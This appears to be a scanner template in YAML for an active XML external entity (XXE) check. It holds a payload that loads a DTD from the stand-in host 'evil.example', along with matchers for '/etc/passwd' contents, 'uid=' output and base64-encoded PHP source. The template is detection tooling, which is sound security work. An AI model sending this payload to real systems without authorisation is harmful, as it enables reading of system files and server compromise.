id: xxe5-0426
name: 'XXE read in xml'
severity: critical
type: active
tags:
  - xxe
  - injection
  - xml
description: 'XXE entity via xml'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      xml:
        - '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "http://evil.example/x.dtd">]><r>&xxe;</r>'
    matchers:
      - type: word
        part: body
        words:
          - 'root:x:0:0'
          - 'root:'
          - 'XXE_OK'
          - 'localhost'
          - 'uid='
          - 'PD9waHA'
